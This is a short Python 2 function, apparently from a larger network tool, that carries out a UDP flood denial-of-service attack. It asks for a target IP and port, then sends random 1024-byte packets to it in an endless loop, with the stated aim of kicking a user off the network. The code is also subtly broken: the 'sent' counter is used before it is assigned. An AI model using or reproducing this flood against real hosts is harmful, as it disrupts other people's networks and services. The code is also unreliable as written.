###############################################################################
# This is to kick a user off the Network
###############################################################################
def DOS():
    print 'This Module is Extremely Dangerous and Untested'
    confirm = raw_input('1 to continue:' )
    if confirm == '1':
        sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM) #Creates a socket
        bytes=random._urandom(1024) #Creates packet
        ip=raw_input('Target IP: ') #The IP we are attacking
        port=input('Port: ') #Port we direct to attack

        while 1: #Infinitely loops sending packets to the port until the program is exited.
            sock.sendto(bytes,(ip,port))
            print "Sent %s amount of packets to %s at port %s." % (sent,ip,port)
            sent= sent + 1
